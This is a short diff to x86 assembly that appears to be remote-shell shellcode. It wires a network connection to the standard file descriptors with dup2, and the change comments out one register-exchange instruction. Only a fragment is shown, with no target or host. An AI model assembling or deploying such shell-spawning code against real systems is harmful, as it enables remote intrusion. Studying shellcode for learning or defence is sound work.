@@ -34,7 +34,7 @@ _start:
 	int	0x80
 
 	;dup2(connfd, 2); dup2(connfd, 1); dup2(connfd, 0);
-	xchg	ebx, eax
+	;xchg	ebx, eax
 	xor	ecx, ecx
 	mov	cl,0x3
 dupfd:
